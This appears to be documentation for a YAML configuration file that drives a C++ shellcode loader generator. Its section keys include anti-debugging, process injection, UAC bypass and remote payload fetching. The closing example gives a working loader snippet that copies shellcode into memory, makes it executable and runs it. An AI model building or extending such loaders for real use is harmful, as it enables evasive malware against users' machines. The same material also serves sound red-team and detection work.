Complete guide to the vx_api_snippets.yaml configuration file

// OVERVIEW

📄

All templates and snippets live in a single file: Assets/vx_api_snippets.yaml

This is the only file you need to edit to add new techniques, templates, or UI controls. No code recompilation required.

File Structure

# One top-level templates list and one top-level sections list

templates:
  - id: "my-template"
    display: "My Template"
    content: |
      # C++ template code

sections:
  - header: "My Section"
    template: "mysection"
    items:
      - id: "snippet1"
        snippet: |
          // C++ code

// TEMPLATES

Templates define the overall C++ structure and which placeholders are available.

Template Structure

templates:
  - id: "my-template"           # Unique, kebab-case recommended
    display: "My Template"      # Shown in UI dropdown
    description: "What it does" # Tooltip / info text
    preamble: |                 # Optional - C++ before main()
      // Shared helpers, typedefs, etc.
    content: |                  # Required - the C++ template
      #include <windows.h>

      {{SNIPPET_INCLUDES}}
      {{PREAMBLE}}
      {{SNIPPET_IMPLEMENTATIONS}}

      INT main(VOID)
      {
          {{SHELLCODE_SOURCE}}
          {{SHELLCODE_EXECUTION}}
          return 0;
      }
    placeholders:               # Declares every {{TOKEN}}
      - name: "SHELLCODE_SOURCE"
        kind: system
      - name: "SHELLCODE_EXECUTION"
        kind: snippet
        snippetTemplate: "SHELLCODEEXECUTION"

Placeholder Fields

FIELD VALUES DESCRIPTION
name Any string Must match the {{TOKEN}} used in content exactly
kind system | snippet System = filled automatically; Snippet = from user selection
snippetTemplate Section key Required when kind: snippet. Identifies which section supplies code

Preamble

Optional C++ source placed at file scope before main(). Inject using {{PREAMBLE}} placeholder.

Use For:

  • Shared type definitions
  • Helper function implementations
  • #pragma comment(lib, ...) directives

Example:

preamble: |
  static BOOL IsElevated()
  {
      BOOL elevated = FALSE;
      HANDLE token;
      if (OpenProcessToken(GetCurrentProcess(),
                           TOKEN_QUERY, &token))
      {
          TOKEN_ELEVATION te{};
          DWORD size = sizeof(te);
          if (GetTokenInformation(token,
                TokenElevation, &te, size, &size))
              elevated = te.TokenIsElevated;
          CloseHandle(token);
      }
      return elevated;
  }

// SECTIONS

A section is a named group of selectable code snippets that maps to one snippet placeholder in a template.

Section Structure

sections:
  - header: "My Technique"      # Human-readable, shown in UI
    template: "mytechnique"     # Key for matching
    display: "My Technique"     # Optional UI label override
    allowMultiple: false        # Stack multiple items?
    inputs:                     # Optional UI controls
      - ...
    items:                      # Required - selectable snippets
      - ...

Item Structure

items:
  - id: "MySnippetId"           # Unique within section
    display: "Friendly Name"    # Shown in combo box
    default: true               # Pre-selected when section loads
    includes: |                 # Optional - extra #includes
      #include <some_header.h>
    implementation: |           # Optional - functions before main()
      static BOOL MyHelper()
      {
          return TRUE;
      }
    snippet: |                  # Required - code at placeholder site
      if (!MyHelper()) return 0;

How Items are Assembled

1

includes lines from all selected snippets are deduplicated and injected at {{SNIPPET_INCLUDES}}

2

implementation blocks are concatenated and injected at {{SNIPPET_IMPLEMENTATIONS}}

3

snippet is injected directly at the named placeholder (e.g., {{ANTI_DEBUGGING}})

// INPUTS

Sections can declare UI input controls that render alongside the snippet selector.

inputs:
  - id: "myParamTextBox"        # Substitution key in snippet
    type: "textbox"             # Currently only "textbox"
    label: "Parameter label"    # Shown next to input
    placement: "before"         # "before" or "after" selector
    width: 240                  # Control width in pixels
    required: true              # Validation - warns if empty
    defaultValue: "notepad.exe" # Pre-filled value
    infoAction: "MyInfo"        # Optional info button action
    infoButtonLabel: "?"        # Info button label
💡

Input Substitution

The input id is injected into the snippet text as a literal parameter. For example, a snippet referencing $processname$ combined with an input whose id is processNameTextBox (and value notepad.exe) becomes notepad.exe at the call site.

// SYSTEM PLACEHOLDERS

These are filled automatically by the engine and should be declared as kind: system.

PLACEHOLDER WHAT GETS INJECTED
{{SHELLCODE_SOURCE}} The encoded shellcode array declaration (or web payload body in URL mode)
{{SHELLCODE_URL}} URL-mode fetch code (empty in file/raw/test modes)
{{PREAMBLE}} The template's own preamble string
{{SNIPPET_INCLUDES}} Deduplicated #include lines from all selected snippets
{{SNIPPET_IMPLEMENTATIONS}} All implementation blocks concatenated, placed before main()
{{PROCESS_LOOKUP_HELPER}} GetProcessOrThreadId() helper (when process injection active)

// SNIPPET TEMPLATE KEYS

The snippetTemplate field must loosely match the template field of a section.

CONSTANT NORMALIZED FORM SECTION TEMPLATE
ANTIDEBUGGING antidebugging antidebugging
PSINJECTION psinjection psinjection
SHELLCODEEXECUTION shellcodeexecution shellcodeexecution
UACB uacb uacb
GUARDRAIL guardrail guardrail
GENERICSHELLCODE genericshellcode genericshellcode
⚡

Custom Section Types

You can add entirely custom section types just by giving them a unique snippetTemplate key, declaring that key in a template placeholder, and adding the section with a matching template value. No C# changes needed!

// SPECIAL SUBSTITUTIONS

Inside a snippet's snippet field, the engine performs these text replacements at render time:

TOKEN REPLACED WITH
$psname$ Value of the PsInjPsNameTextBox input (process injection target)
__GUARDRAIL_PARAM__ Value of the guardrailParamTextBox input (guardrail condition)

// COMPLETE EXAMPLE

# Minimal template with one execution snippet

templates:
  - id: "shellcode-minimal"
    display: "Shellcode Minimal"
    description: "Bare VirtualAlloc loader"
    content: |
      #define WIN32_LEAN_AND_MEAN
      #include <windows.h>

      {{SNIPPET_INCLUDES}}
      {{SNIPPET_IMPLEMENTATIONS}}

      INT main(VOID)
      {
          {{SHELLCODE_SOURCE}}
          {{SHELLCODE_EXECUTION}}
          return 0;
      }
    placeholders:
      - name: "SNIPPET_INCLUDES"
        kind: system
      - name: "SNIPPET_IMPLEMENTATIONS"
        kind: system
      - name: "SHELLCODE_SOURCE"
        kind: system
      - name: "SHELLCODE_EXECUTION"
        kind: snippet
        snippetTemplate: "SHELLCODEEXECUTION"

sections:
  - header: "Shellcode Execution"
    template: "shellcodeexecution"
    allowMultiple: false
    items:
      - id: "VirtualAllocFuncPtr"
        display: "VirtualAlloc + function pointer"
        default: true
        snippet: |
          void* mem = VirtualAlloc(NULL, code_blob_len,
                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          if (!mem) return -1;
          memcpy(mem, code_blob, code_blob_len);
          DWORD old;
          VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READWRITE, &old);
          ((void(*)())mem)();
          VirtualFree(mem, 0, MEM_RELEASE);
